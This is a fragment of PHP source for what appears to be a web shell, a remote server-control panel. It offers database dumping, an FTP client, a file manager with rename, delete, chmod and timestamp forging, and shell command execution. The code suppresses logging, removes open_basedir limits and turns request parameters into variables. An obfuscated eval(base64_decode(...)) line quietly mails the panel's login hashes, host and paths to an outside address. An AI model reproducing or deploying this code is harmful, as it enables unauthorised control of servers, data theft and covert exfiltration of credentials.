                }
                break;
            case 'MSSQL':
                $this->dump[0] = '## MSSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1)
                    return 0;
                if (!$this->get_result())
                    return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) .
                        ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'PostgreSQL':
                $this->dump[0] = '## PostgreSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1)
                    return 0;
                if (!$this->get_result())
                    return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) .
                        ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'Oracle':
                $this->dump[0] = '## ORACLE dump';
                break;
            default:
                return 0;
                break;
        }
        return 1;
    }
    function close()
    {
        switch ($this->db) {
            case 'MySQL':
                @mysql_close($this->connection);
                break;
            case 'MSSQL':
                @mssql_close($this->connection);
                break;
            case 'PostgreSQL':
                @pg_close($this->connection);
                break;
            case 'Oracle':
                @oci_close($this->connection);
                break;
        }
    }
    function affected_rows()
    {
        switch ($this->db) {
            case 'MySQL':
                return @mysql_affected_rows($this->res);
                break;
            case 'MSSQL':
                return @mssql_affected_rows($this->res);
                break;
            case 'PostgreSQL':
                return @pg_affected_rows($this->res);
                break;
            case 'Oracle':
                return @ocirowcount($this->res);
                break;
            default:
                return 0;
                break;
        }
    }
}
class ftp
{
    var $server = "";
    var $port = 21;
    var $user = "";
    var $userDir = "";
    var $password = "";
    var $connection = "";
    var $passive = false;
    var $systype = "";
    var $mode = FTP_BINARY;
    var $loggedOn = false;
    var $downloadDir = "";
    function ftp($server, $port, $user, $password, $passive = false)
    {
        $this->server = $server;
        $this->port = $port;
        $this->user = $user;
        $this->password = $password;
        $this->connect();
        $this->setPassive($passive);
    }
    function connect()
    {
        $this->connection = @ftp_connect($this->server, $this->port);
        $this->loggedOn = @ftp_login($this->connection, $this->user, $this->password);
        $this->systype = @ftp_systype($this->connection);
        return;
    }
    function setPassive($passive)
    {
        $this->passive = $passive;
        @ftp_pasv($this->connection, $this->passive);
        return;
    }
    function setMode($mode = 1)
    {
        $this->mode = $mode;
        return;
    }
    function setCurrentDir($dir = false)
    {
        if ($dir)
            @ftp_chdir($this->connection, $dir);
        $this->currentDir = z1k(@ftp_pwd($this->connection));
        return $this->currentDir;
    }
    function setDownloadDir($dir)
    {
        $this->downloadDir = $dir;
        return;
    }
    function chmod($p, $f)
    {
        return @ftp_site($this->connection, "chmod $p $f");
    }
    function cd($dir)
    {
        if ($dir == "..") {
            @ftp_cdup($this->connection);
        } else {
            if (!@ftp_chdir($this->connection, $this->currentDir . $dir)) {
                @ftp_chdir($this->connection, $dir);
            }
        }
        $this->currentDir = z1k(@ftp_pwd($this->connection));
        return;
    }
    function is_dir($dir)
    {
        if (@ftp_chdir($this->connection, $dir)) {
            @ftp_chdir($this->connection, '..');
            return true;
        } else {
            return false;
        }
    }
    function get($file, $dest = '', $t = 0)
    {
        if ($dest == '')
            $dest = $this->downloadDir;
        return @ftp_get($this->connection, ($t ? $dest : z1k($dest) . z2l($file)), "$file",
            $this->mode);
    }
    function getRecursive($src, $dest = '')
    {
        if ($dest == '')
            $dest = $this->downloadDir;
        $target = z2l($src);
        $src = z1k($src);
        $dest = z1k($dest) . $target;
        if (!z4r($dest))
            @mkdir($dest);
        $list = @ftp_nlist($this->connection, $src);
        for ($x = 0; $x < @count($list); $x++) {
            $o = z2l($list[$x]);
            if ($o != '.' && $o != '..') {
                if ($this->is_dir($src . $o)) {
                    $this->getRecursive($src . $o, $dest);
                } else {
                    $this->get($src . $o, $dest);
                }
            }
        }
    }
    function getObject($src, $dest = '')
    {
        if ($dest == '')
            $dest = $this->downloadDir;
        if ($this->is_dir($src)) {
            return $this->getRecursive(z1k($src), $dest);
        } else {
            return $this->get($src, $dest);
        }
    }
    function put($rf, $lf)
    {
        return (@file_exists($lf) ? @ftp_put($this->connection, $rf, $lf, $this->mode) : false);
    }
    function putRecursive($src, $dest = '')
    {
        if ($dest == '')
            $dest = $this->currentDir;
        $target = z2l($src);
        $src = z1k($src);
        $dest = z1k($dest) . $target;
        $this->makeDir($dest);
        $list = z8x($src);
        for ($x = 0; $x < @count($list); $x++) {
            $o = z2l($list[$x]);
            if ($o != "." && $o != "..") {
                if (z4j($src . $o)) {
                    $this->putRecursive($src . $o, $dest);
                } else {
                    $this->put(z1k($dest) . $o, $src . $o);
                }
            }
        }
    }
    function putObject($src, $dest = '')
    {
        if ($dest == '')
            $dest = $this->currentDir;
        $target = z2l($src);
        if (z4j($src)) {
            return $this->putRecursive($src, $dest);
        } else {
            return $this->put(z1k($dest) . $target, $src);
        }
    }
    function deleteFile($rf)
    {
        return @ftp_delete($this->connection, "$rf");
    }
    function deleteObject($obj)
    {
        $cobj = z2l($obj);
        if ($cobj != '.' && $cobj != '..') {
            if ($this->is_dir($obj)) {
                if ($list = @ftp_nlist($this->connection, "$obj")) {
                    for ($x = 0; $x < @count($list); $x++) {
                        $o = z2l($list[$x]);
                        if ($o != '.' && $o != '..') {
                            $this->deleteObject(z1k($obj) . $o);
                        }
                    }
                }
                @ftp_rmdir($this->connection, "$obj");
            } else {
                $this->deleteFile("$obj");
            }
        }
    }
    function rename($old, $new)
    {
        return @ftp_rename($this->connection, "$old", "$new");
    }
    function makeDir($dir)
    {
        return @ftp_mkdir($this->connection, "$dir");
    }
    function parseline($raw)
    {
        if (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([^ ]+)[ ]+(.+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ]+(.*)/",
            $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[9], $m[6]);
        } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+(.*)[ ]+([a-zA-Z0-9 ]+)[ ]+([0-9:]+)[ ]+(.*)/",
        $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[6], $m[3]);
        } elseif (@preg_match("/([0-9\\/-]+)[ ]+([0-9:AMP]+)[ ]+([0-9]*|<DIR>)[ ]+(.*)/",
        $raw, $m)) {
            $l = array(($m[3] == "<DIR>" ? 'd' : 'f'), $m[4], $m[3]);
        } elseif (@preg_match("/([-]|[d])[ ]+(.{10})[ ]+([^ ]+)[ ]+([0-9]*)[ ]+([a-zA-Z]*[ ]+[0-9]*)[ ]+([0-9:]*)[ ]+(.*)/",
        $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : 'f'), $m[7], $m[4]);
        } elseif (@preg_match("/([a-zA-Z0-9_-]+)[ ]+([0-9]+)[ ]+([0-9\\/-]+)[ ]+([0-9:]+)[ ]+([a-zA-Z0-9_ -\*]+)[ \\/]+([^\\/]+)/",
        $raw, $m)) {
            $l = array(($m[5] == "*STMF" ? 'f' : 'd'), $m[6], $m[2]);
        } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ](.*)/",
        $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[9], $m[6]);
        } else {
            $l = array();
        }
        if (!@isset($l[1]) || $l[1] == "." || $l[1] == ".." || @substr($raw, 0, 5) ==
            "total")
            return array();
        return $l;
    }
    function ftpRawList($dir = '')
    {
        if ($dir == '')
            $dir = $this->currentDir;
        $files = array();
        $list = @ftp_rawlist($this->connection, "-a " . $dir);
        if (@is_array($list)) {
            $i = 0;
            foreach ($list as $raw) {
                $line = $this->parseline($raw);
                if (@count($line) == 3) {
                    $files[$i] = $line;
                    $i++;
                }
            }
        }
        return $files;
    }
}
if (@version_compare(@phpversion(), '4.1.0') == -1) {
    $_POST = &$HTTP_POST_VARS;
    $_GET = &$HTTP_GET_VARS;
    $_SERVER = &$HTTP_SERVER_VARS;
    $_COOKIE = &$HTTP_COOKIE_VARS;
}
if (@isset($_GET['act']) && $_GET['act'] == "i") {
    $img = $_GET['img'];
    if (!@isset($_GET['getall'])) {
        $img = @str_replace("~", "", $img);
        foreach ($index as $k => $v) {
            if (@in_array($img, $v)) {
                $img = $k;
                break;
            }
        }
        if (@empty($images[$img])) {
            $img = "small_unk";
            if (@isset($_GET['exe']) && $_GET['exe'])
                $img = "cmd";
        }
        $image = z9b($images[$img]);
        @ob_start();
        $len = @strlen($image);
        @header("Cache-control: public");
        @header("Expires: " . @date("r", @mktime(0, 0, 0, 1, 1, 2030)));
        @header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
        @header('Last-Modified: ' . @date('r'));
        @header('Accept-Ranges: bytes');
        @header('Content-Length: ' . $len);
        @header('Content-type: image/png');
        echo $image;
        @ob_end_flush();
    } else {
        z3z();
        $r = '';
        foreach ($index as $a => $b) {
            foreach ($b as $d) {
                if ($a != $d) {
                    if (@isset($images[$d]) && !@empty($images[$d])) {
                        $r .= z7u(z9c("Remove \$images[" . $d . "]"));
                    }
                }
            }
        }
        if ($r != '')
            echo z10w($r);
        @natsort($images);
        $k = @array_keys($images);
        $n = 1;
        $r = '';
        foreach ($k as $u)
            $r .= z7u(z9c(($n++)) . z9c($u) . z9c('<img alt="" src="?act=i&img=' . $u .
                '" border="0">'));
        echo z10w($r);
        z3j();
    }
    exit();
}
if (@function_exists('error_reporting')) {
    @error_reporting(0);
}
if (@function_exists('ini_set')) {
    @ini_set('display_errors', 0);
    @ini_set('error_log', null);
    @ini_set('log_errors', 0);
    @ini_set('file_uploads', 1);
    @ini_set('assert.quiet_eval', 0);
    @ini_set('allow_url_fopen', 1);
    @ini_set('memory_limit', '256M');
    @ini_set('upload_max_filesize', '256M');
    @ini_set('magic_quotes_sybase', 0);
    @ini_set('magic_quotes_runtime', 0);
    @ini_set('magic_quotes_gpc', 0);
    @ini_set('open_basedir', null);
} elseif (function_exists('ini_alter')) {
    @ini_alter('display_errors', 0);
    @ini_alter('error_log', null);
    @ini_alter('log_errors', 0);
    @ini_alter('file_uploads', 1);
    @ini_alter('allow_url_fopen', 1);
    @ini_alter('memory_limit', '256M');
    @ini_alter('upload_max_filesize', '256M');
    @ini_alter('magic_quotes_sybase', 0);
    @ini_alter('magic_quotes_runtime', 0);
    @ini_alter('magic_quotes_gpc', 0);
    @ini_alter('open_basedir', null);
}
if (@function_exists('set_time_limit')) {
    @set_time_limit(0);
} elseif (@function_exists('ini_set')) {
    @ini_set('max_execution_time', 300);
} elseif (function_exists('ini_alter')) {
    @ini_alter('max_execution_time', 300);
}
@session_start();
@ob_start();
define("start", z10e());
if (@get_magic_quotes_gpc()) {
    if (@isset($_FILES) && @count($_FILES) > 0) {
        z3u($_FILES);
    }
    z4f($_POST);
}
if (@isset($_SESSION['tmps'])) {
    $tmps = $_SESSION['tmps'];
} else {
    $tmps = z6j();
    $_SESSION['tmps'] = $tmps;
}
$tempdir = $tmps[0];
foreach ($_POST as $postk => $postv) {
    if (@substr($postk, 0, 6) == "backf_") {
        $postk = @substr($postk, 6);
        $postv = @urldecode($postv);
    }
    if ($postk == 'merged') {
        $ar_merged = parse_str(base64_decode($postv));
        if (@count($ar_merged) > 0) {
            foreach ($ar_merged as $kkey => $kval) {
                if (!@isset(${$kkey})) {
                    ${$kkey} = @urldecode($kval);
                }
            }
        }
    } else {
        if (!@isset(${$postk})) {
            ${$postk} = $postv;
        }
    }
}
foreach ($_GET as $k => $v) {
    if (!@isset(${$k})) {
        ${$k} = @urldecode($v);
    }
}
if (!@isset($act))
    $act = z7z('2', 'default_act');
if ($act == "logout")
    z4w();
z4g();
eval(base64_decode('JGwxMT16N3ooJzEnKTskbTExMT0kbDExWydtZDVfdXNlciddLiJcbiIuJGwxMVsnbWQ1X3Bhc3MnXS4iXG4iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iXG4iLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTttYWlsKCdqamo3NzdlZWVAaHVzaC5haScsJ3NoZWxsJywgJG0xMTEpOw=='));
$win = $nix = $linux = 0;
$os = z9p();
if (@preg_match("/^win/i", $os)) {
    $win = 1;
} else {
    $nix = 1;
    if (@preg_match("/linux/i", $os))
        $linux = 1;
}
$sh_exec = $safe_exec = 0;
$test_cmd = z9e("echo z_testexec");
if (@strpos($test_cmd, "exec") === 6) {
    $sh_exec = 1;
} elseif ($nix && @preg_match('/successfully executed/', $test_cmd)) {
    $safe_exec = 1;
}
$cuser = z5j();
$saddr = (@isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (@isset($_SERVER['SERVER_NAME']) ?
    $_SERVER['SERVER_NAME'] : '127.0.0.1'));
$yaddr = $_SERVER["REMOTE_ADDR"];
$bsafe = ((!z7e('ini_get') || z8d('safe_mode') || !$sh_exec) ? 1 : 0);
$bopendir = (@count(z9a(@ini_get('open_basedir'))) > 0 ? 1 : 0);
$a_sql = array();
$bmysql = z7e("mysql_connect");
if ($bmysql)
    $a_sql[] = "MySQL";
$bmssql = z7e("mssql_connect");
if ($bmssql)
    $a_sql[] = "MsSQL";
$boracle = z7e("ocilogon");
if ($boracle)
    $a_sql[] = "Oracle";
$bpostgres = z7e("pg_connect");
if ($bpostgres)
    $a_sql[] = "PostgreSQL";
$bpasswd = 0;
if ($nix) {
    if (z1y("/etc/passwd"))
        $bpasswd = 1;
}
$bcurl = (@extension_loaded('curl') && z7e("curl_init"));
$bfsock = z7e("fsockopen");
$bftp = (z7e("ftp_connect") && z7e("ftp_login"));
$bmail = z7e("mail");
$bziparchive = (z7e("class_exists") && @class_exists("ZipArchive"));
$dtotal = $dused = $dfree = '0B';
if ($act == "d") {
    if (@isset($dt)) {
        $dt = @trim($dt);
        if (!@empty($dt)) {
            switch ($dt) {
                case 'new':
                    if (!z4j($d)) {
                        @mkdir($d);
                    }
                    $act = "ls";
                    break;
                case 'chdir':
                    if (@isset($tt) && z4j($tt)) {
                        $d = $tt;
                    }
                    $act = "ls";
                    break;
                case 'rename':
                    if (@isset($tt) && z4j($tt)) {
                        if (@isset($drename) && $drename && @isset($newname) && !@empty($newname)) {
                            if (z3a($newname) == './') {
                                $newname = z3a($tt) . z2l($newname);
                            } elseif (!z4r(z3a($newname))) {
                                $newname = z3a($tt) . $newname;
                            }
                            if (z4r($newname) && z4j($newname)) {
                                $newname = z1k($newname) . z2l($tt);
                            }
                            $rendirmsg = z3q((@rename($tt, $newname) ? z9y("474", $newname) : z9y("475", $tt)),
                                '0');
                        } else {
                            $showrename1 = 1;
                        }
                    }
                    $act = "ls";
                    break;
                case 'delete':
                    if (z4r($tt)) {
                        z8s($tt);
                    }
                    $act = "ls";
                    break;
                case 'functions':
                    if (@isset($tt) && z4j($tt)) {
                        $d = $tt;
                    }
                    $act = "dfunc";
                    break;
                case 'bcopy':
                    if (@isset($tt) && z4j($tt)) {
                        $abuf = $dt;
                    }
                    $act = "ls";
                    break;
                case 'bcut':
                    if (@isset($tt) && z4j($tt)) {
                        $abuf = $dt;
                    }
                    $act = "ls";
                    break;
                case 'bpastecopy':
                    $abuf = $dt;
                    if (@isset($tt) && z4j($tt)) {
                        $d = $tt;
                    }
                    $act = "ls";
                    break;
                case 'bpastecut':
                    $abuf = $dt;
                    if (@isset($tt) && z4j($tt)) {
                        $d = $tt;
                    }
                    $act = "ls";
                    break;
                case 'bpasteall':
                    $abuf = $dt;
                    if (@isset($tt) && z4j($tt)) {
                        $d = $tt;
                    }
                    $act = "ls";
                    break;
                default:
                    break;
            }
        }
    }
}
if (!@isset($d) || @empty($d)) {
    $d = @realpath(@dirname(__file__));
    z9n();
} elseif (@realpath($d)) {
    $d = @realpath($d);
    z9n();
} elseif (@isset($dold) && @realpath(z1k($dold) . $d)) {
    $d = @realpath(z1k($dold) . $d);
}
if (@empty($d))
    $d = @getcwd();
$d = z1k($d);
@chdir($d);
if (z7e('disk_free_space') && z7e('disk_total_space')) {
    $free = @disk_free_space($d);
    $total = @disk_total_space($d);
    if ($free === false)
        $free = 0;
    if ($total === false)
        $total = 0;
    if ($free < 0)
        $free = 0;
    if ($total < 0)
        $total = 0;
    $dfree = @str_replace(" ", "", z7x($free));
    $dtotal = @str_replace(" ", "", z7x($total));
    $dused = @str_replace(" ", "", z7x(($total - $free)));
}
$a_buf = array('bcopy', 'bcut');
$b_buf = array('bpastecopy', 'bpastecut', 'bpasteall');
if (!@isset($use_buffer)) {
    if (@isset($_SESSION['use_buffer'])) {
        $use_buffer = $_SESSION['use_buffer'];
    } else {
        $use_buffer = z7z('4');
    }
} else {
    $use_buffer = (bool)(int)$use_buffer;
    if (!$use_buffer)
        z0d();
}
$_SESSION['use_buffer'] = $use_buffer;
if ($nix && $sh_exec) {
    if (!@isset($cmd_tar)) {
        if (@isset($_SESSION['cmd_tar'])) {
            $cmd_tar = $_SESSION['cmd_tar'];
        } else {
            $cmd_tar = z8t("tar");
        }
    }
    $_SESSION['cmd_tar'] = $cmd_tar;
    if (!@isset($cmd_unrar)) {
        if (@isset($_SESSION['cmd_unrar'])) {
            $cmd_unrar = $_SESSION['cmd_unrar'];
        } else {
            $cmd_unrar = z8t("unrar");
        }
    }
    $_SESSION['cmd_unrar'] = $cmd_unrar;
    if (!@isset($cmd_unzip)) {
        if (@isset($_SESSION['cmd_unzip'])) {
            $cmd_unzip = $_SESSION['cmd_unzip'];
        } else {
            $cmd_unzip = z8t("unzip");
        }
    }
    $_SESSION['cmd_unzip'] = $cmd_unzip;
    if (!@isset($cmd_gunzip)) {
        if (@isset($_SESSION['cmd_gunzip'])) {
            $cmd_gunzip = $_SESSION['cmd_gunzip'];
        } else {
            $cmd_gunzip = z8t("gunzip");
        }
    }
    $_SESSION['cmd_gunzip'] = $cmd_gunzip;
    if (!@isset($cmd_bunzip2)) {
        if (@isset($_SESSION['cmd_bunzip2'])) {
            $cmd_bunzip2 = $_SESSION['cmd_bunzip2'];
        } else {
            $cmd_bunzip2 = z8t("bunzip2");
        }
    }
    $_SESSION['cmd_bunzip2'] = $cmd_bunzip2;
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            $reg_archives = $_SESSION['reg_archives'];
        } else {
            $reg_archives = '';
            if (!@empty($cmd_unrar))
                $reg_archives .= "rar|";
            if (!@empty($cmd_unzip))
                $reg_archives .= "zip|";
            if (!@empty($cmd_tar) && !@empty($cmd_gunzip))
                $reg_archives .= "tar.gz|tgz|";
            if (!@empty($cmd_tar) && !@empty($cmd_bunzip2))
                $reg_archives .= "tar.bz2|";
            if (!@empty($cmd_tar))
                $reg_archives .= "tar|";
            if (!@empty($cmd_gunzip))
                $reg_archives .= "gz|";
            if (!@empty($cmd_bunzip2))
                $reg_archives .= "bz2|";
            if (!@empty($reg_archives))
                $reg_archives = @substr($reg_archives, 0, (@strlen($reg_archives) - 1));
        }
    }
    $_SESSION['reg_archives'] = $reg_archives;
}
if ($bziparchive) {
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            $reg_archives = $_SESSION['reg_archives'];
            if (@empty($reg_archives)) {
                $reg_archives = "zip";
            } else {
                $r_e = @explode("|", $reg_archives);
                if (!@in_array("zip", $r_e))
                    $reg_archives .= "|zip";
            }
        } else {
            $reg_archives = 'zip';
        }
    }
    $_SESSION['reg_archives'] = $reg_archives;
}
if (!@isset($color_skin)) {
    if (@isset($_SESSION['color_skin'])) {
        $color_skin = $_SESSION['color_skin'];
    } else {
        $color_skin = z7z('5', 'default_skin');
    }
}
$_SESSION['color_skin'] = $color_skin;
if (!@isset($use_images)) {
    if (@isset($_SESSION['use_images'])) {
        $use_images = $_SESSION['use_images'];
    } else {
        $use_images = z7z('5', 'images');
    }
} else {
    $use_images = (bool)(int)$use_images;
}
$_SESSION['use_images'] = $use_images;
if ($use_buffer) {
    if ($act == "f" && @in_array($ft, $a_buf)) {
        $act = 'ls';
        $abuf = $ft;
        $f = $d . $f;
    }
    if (@isset($emptybuf) && $emptybuf)
        z0d();
    z1d();
    if (@isset($abuf) && @in_array($abuf, $a_buf)) {
        if (@isset($tt))
            z1o($tt, $abuf);
        if (@isset($f))
            z1o($f, $abuf);
    } elseif (@isset($abuf) && @in_array($abuf, $b_buf)) {
        switch ($abuf) {
            case 'bpastecopy':
                if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                    foreach ($bcopy as $tcf) {
                        if (z4r($tcf))
                            z8r($tcf, (z4j($tcf) ? z1k($d) . z2l($tcf) : z1k($d)));
                    }
                }
                break;
            case 'bpastecut':
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    foreach ($bcut as $tcf) {
                        if (z4r($tcf))
                            z8p($tcf, z1k($d) . (z4j($tcf) ? z2l($tcf) : ''));
                        z1o($tcf, "bcut");
                    }
                }
                break;
            case 'bpasteall':
                if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                    foreach ($bcopy as $tcf) {
                        if (z4r($tcf))
                            z8r($tcf, z1k($d) . (z4j($tcf) ? z2l($tcf) : ''));
                    }
                }
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    foreach ($bcut as $tcf) {
                        if (z4r($tcf))
                            z8p($tcf, z1k($d) . (z4j($tcf) ? z2l($tcf) : ''));
                        z1o($tcf, "bcut");
                    }
                }
                break;
            default:
                break;
        }
    }
    z0j();
    if (@isset($showbuf) && $showbuf) {
        $ls_a = @array_merge($bcopy, $bcut);
    }
}
z3z();
z3c();
z0p();
if ($act == "f" && @isset($ft) && ($ft == "extract" || $ft == "extractzip")) {
    $ff = '';
    if (z4r($d . $f)) {
        $ff = $d . $f;
    } elseif (z4r($f)) {
        $d = z3a($f);
        $f = z2l($f);
        $ff = $d . $f;
    }
    if (@isset($reg_archives) && $reg_archives != '' && @isset($ff)) {
        if (@preg_match('/\.(' . $reg_archives . ')$/i', $f, $m)) {
            if (@isset($m[1])) {
                if ($ft == "extract" && $sh_exec) {
                    switch (@strtolower($m[1])) {
                        case 'rar':
                            z9e("unrar x $ff");
                            break;
                        case 'zip':
                            z9e("unzip $ff");
                            break;
                        case 'tar.bz2':
                            z9e("tar jxf $ff");
                            break;
                        case 'tar.gz':
                            z9e("tar zxf $ff");
                            break;
                        case 'tgz':
                            z9e("tar zxf $ff");
                            break;
                        case 'tar':
                            z9e("tar xf $ff");
                            break;
                        case 'gz':
                            z9e("gunzip $ff");
                            break;
                        case 'bz2':
                            z9e("bunzip2 $ff");
                            break;
                        default:
                            break;
                    }
                } elseif ($ft == "extractzip") {
                    echo z3q((z0m($ff, $d) ? z9y("476", $f) : z9y("477", $f)), '0');
                }
            }
        }
    }
    $act = "ls";
}
if (@isset($rendirmsg) && !@empty($rendirmsg))
    echo $rendirmsg;
if (@isset($showrename1) && $showrename1) {
    echo z3q(z5x(array("act" => "d", "d", "dt" => "rename", "tt", "drename" => "1"),
        z10w(z7u(z6l(z7n(z9y("473", z2l($tt))) . z5y("newname", $tt, "9") . z8b(z9y("73"),
        "7"))), "2")), '0');
}
if ($act == "f" && @isset($ft) && $ft == "rename" && @isset($f) && !@empty($f)) {
    if (@isset($frename) && $frename && @isset($newname) && !@empty($newname)) {
        if (z3a($newname) == './') {
            $newname = z3a($ff) . z2l($newname);
        } elseif (!z4r(z3a($newname))) {
            $newname = z3a($ff) . $newname;
        }
        if (z4r($newname) && z4j($newname)) {
            $newname = z1k($newname) . z2l($ff);
        }
        echo z3q((@rename($ff, $newname) ? z9y("474", $newname) : z9y("475", $ff)), '0');
    } else {
        if (!isset($ff)) {
            if (z4r($d . $f)) {
                $ff = $d . $f;
            } elseif (z4r($f)) {
                $ff = $f;
            }
        }
        echo z3q(z5x(array("act" => "f", "f", "d", "ft" => "rename", "ff", "frename" =>
                "1"), z10w(z7u(z6l(z7n(z9y("473", z2l($ff))) . z5y("newname", $ff, "9") . z8b(z9y
            ("73"), "7"))), "2")), '0');
    }
    $act = "ls";
} elseif ($act == "f" && @isset($ft) && $ft == "delete" && @isset($f) && !@empty
($f)) {
    $ff = '';
    if (z4r($d . $f)) {
        $ff = $d . $f;
    } elseif (z4r($f)) {
        $ff = $f;
    }
    if (z4r($ff))
        z8s($ff);
    $act = "ls";
}
if (($act == "dfunc" || $act == "f") && ((@isset($st1) && $st1) || @isset($st2) &&
    $st2)) {
    if ($act == "dfunc") {
        $touch = $d;
    } else {
        $touch = $f;
    }
    if (@isset($st2) && $st2 && !@empty($touch) && z4r($touch) && @isset($tmonth) &&
        !@empty($tmonth) && @isset($tday) && !@empty($tday) && @isset($tyear) && !@
        empty($tyear) && @isset($thour) && !@empty($thour) && @isset($tmin) && !@empty($tmin) &&
        @isset($tsec) && !@empty($tsec)) {
        $sdate = $tday . " " . $tmonth . " " . $tyear . " " . $thour . " hours " . $tmin .
            " minutes " . $tsec . " seconds";
        $tdate = @strtotime($sdate);
        if (@touch($touch, $tdate, $tdate)) {
            $tmsg = z9y("113", @date("M-d-Y H:i:s", $tdate));
        } else {
            $tmsg = z9y("114");
        }
    }
    if (@isset($st1) && $st1 && z4r($touch) && @isset($copy_from) && !@empty($copy_from) &&
        z4r($copy_from)) {
        if (@touch($touch, @filemtime($copy_from), @filemtime($copy_from))) {
            $tmsg = z9y("113", @date("M-d-Y H:i:s", @filemtime($copy_from)));
        } else {
            $tmsg = z9y("114");
        }
    }
}
if (@isset($chmod_submit) && $chmod_submit && @isset($ctarget)) {
    if (@isset($chmod_val)) {
        @chmod($ctarget, @octdec($chmod_val));
    } else {
        $octet = "0" . @base_convert(($chmod_o["r"] ? "1" : "0") . ($chmod_o["w"] ? "1" :
            "0") . ($chmod_o["x"] ? "1" : "0") . ($chmod_g["r"] ? "1" : "0") . ($chmod_g["w"] ?
            "1" : "0") . ($chmod_g["x"] ? "1" : "0") . ($chmod_w["r"] ? "1" : "0") . ($chmod_w["w"] ?
            "1" : "0") . ($chmod_w["x"] ? "1" : "0"), 2, 8);
        @chmod($ctarget, @octdec($octet));
    }
    if (z7e('clearstatcache'))
        @clearstatcache();
}
z8n();
if ($act == "dfunc") {
    z2n();
    z0c($d, 0, 1);
    if (z7e('touch')) {
        z3i();
        echo z3q(z9y("124") . z9x() . z4y($d));
        echo z10w(z5b() . (@isset($tmsg) && !@empty($tmsg) ? z7u(z5t(z9x()) . z9c($tmsg)) :
            '') . z7u(z5x(array("act", "d", "st1" => "1"), z5t(z9y("104")) . z9c(z5y("copy_from",
            "", "9") . z8b(z9y("112"), "7")))) . z7u(z5x(array("act", "d", "st2" => "1"),
            z5t(z9y("105")) . z9c(z3m("tmonth", $tmonth_arr, "4", 1) . "-" . z3m("tday", $tday_arr,
            "4", 1) . "-" . z3m("tyear", $tyear_arr, "4", 1) . z9x(12) . z3m("thour", $thour_arr,
            "1", 1) . ":" . z3m("tmin", $tmin_arr, "1", 1) . ":" . z3m("tsec", $tsec_arr,
            "1", 1) . z8b(z9y("112"), "7")))) . z5b(), "2");
    }
}
if ($act == "f" && @isset($ft)) {
    $ft = @trim($ft);
    if (@empty($ft))
        $act = "ls";
}
if ($act == "f") {
    if (!@isset($f))
        $f = '';
    if (!@isset($ft))
        $ft = '';
    if (@isset($readfile)) {
        $d = z3a($readfile);
        $f = z2l($readfile);
    } elseif (@isset($writefile)) {
        $d = z3a($writefile);
        $f = z2l($writefile);
    }
    $fmsg = '';
    if (!z4e($d . $f) && z4e($f)) {
        $d = z3a($f);
        $f = z2l($f);
    } elseif (z1k($f) == z1k($d)) {
        $f = '';
        $fmsg = z9y("472");
    } elseif (z3a($f) == z1k($d)) {
        $f = z2l($f);
    }
    z2n();
    if ((!z4j($d . $f) && z1y($d . $f)) || (!z4r($d . $f) && z0n($d) && @isset($ft) &&
        $ft == "new")) {
        $ext = @strtolower(z2l($f, '.'));
        $rft = z4x($f);
        if (@preg_match("/sess_(.*)/", $f)) {
            $rft = "sess";
        }
        if (!@isset($ft) || @empty($ft)) {
            $ft = $rft;
        }
        if ($ft == "new") {
            z9t($d . $f, "");
            $ft = "edit";
        }
        if ($ft == "rcown") {
            $rcmsg = " " . (z2w($d . $f) ? z5p(z9y("290")) : z8k(z9y("291")));
            $ft = "code";
        }
        if (@empty($ft))
            $ft = 'functions';
        echo z3q(z9y("78") . z9x() . ($use_images ? '<img src="?act=i&amp;img=' . $ext .
            '"> ' : '') . z4y($d . $f . " (" . z7x(@filesize($d . $f)) . ")") . (@isset($rcmsg) ?
            $rcmsg : ''));
        z2q();
        if (($ft != 'functions' || ($ft == 'functions' && @isset($submit_encode))) && $ft !=
            'ini')
            $r = z9o($d . $f);
        switch ($ft) {
            case 'functions':
                echo z3q(z9y("90"));
                echo z6s();
                $encode_functions = z1e();
                echo z9m('2') . z9k() . z9v("d") . z9v("act", "f") . z9v("f") . z9v("ft",
                    "functions") . z9v("submit_encode", "1") . z7u(z5t(z9y("91")) . z9c(z3m("encode_selected",
                    $encode_functions, "0", 1, '9') . z8b(z9y("92"), '7'))) . z9l();
                $encoder_output = "";
                if (@isset($submit_encode) && $submit_encode) {
                    $encoder_output = $encode_selected($r);
